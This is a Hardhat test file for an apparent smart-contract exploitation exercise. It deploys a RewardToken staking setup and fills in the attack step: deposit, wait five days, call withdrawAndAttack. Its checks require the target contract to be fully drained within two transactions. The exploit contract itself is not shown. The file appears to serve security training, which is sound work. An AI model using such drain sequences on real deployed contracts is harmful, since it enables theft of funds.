const { time, loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { anyValue } = require('@nomicfoundation/hardhat-chai-matchers/withArgs');
const { expect } = require('chai');
const { ethers } = require('hardhat');

const NAME = 'RewardToken';

describe(NAME, function () {
	async function setup() {
		const [, attackerWallet] = await ethers.getSigners();

		const AttackerFactory = await ethers.getContractFactory('RewardTokenAttacker');
		const attackerContract = await AttackerFactory.deploy();

		const NFTToStakeFactory = await ethers.getContractFactory('NftToStake');
		const NFTToStakeContract = await NFTToStakeFactory.deploy(attackerContract.address);

		const DepositoorFactory = await ethers.getContractFactory('Depositoor');
		const depositoorContract = await DepositoorFactory.deploy(NFTToStakeContract.address);

		const RewardTokenFactory = await ethers.getContractFactory(NAME);
		const rewardTokenContract = await RewardTokenFactory.deploy(depositoorContract.address);

		await depositoorContract.setRewardToken(rewardTokenContract.address);

		return {
			attackerContract,
			NFTToStakeContract,
			depositoorContract,
			rewardTokenContract,
			attackerWallet,
		};
	}

	describe('exploit', async function () {
		let attackerContract,
			NFTToStakeContract,
			depositoorContract,
			rewardTokenContract,
			attackerWallet;
		before(async function () {
			({
				attackerContract,
				NFTToStakeContract,
				depositoorContract,
				rewardTokenContract,
				attackerWallet,
			} = await loadFixture(setup));
		});

		// prettier-ignore
		it("conduct your attack here", async function () {
			await attackerContract.deposit(NFTToStakeContract.address,depositoorContract.address);
			await time.increase(5*24*3600); // increase 5 days and earn reward
			// you can technically wait for enough time and claim the reward without having to exploit it, but that need 2 txs to claim
			// await attackerContract.normalClaim(depositoorContract.address);
			await attackerContract.withdrawAndAttack(depositoorContract.address);
			
      });

		after(async function () {
			expect(await rewardTokenContract.balanceOf(attackerContract.address)).to.be.equal(
				ethers.utils.parseEther('100'),
				'Balance of attacking contract must be 100e18 tokens'
			);
			expect(await rewardTokenContract.balanceOf(depositoorContract.address)).to.be.equal(
				0,
				'Attacked contract must be fully drained'
			);
			expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.lessThan(
				3,
				'must exploit in two transactions or less'
			);
		});
	});
});
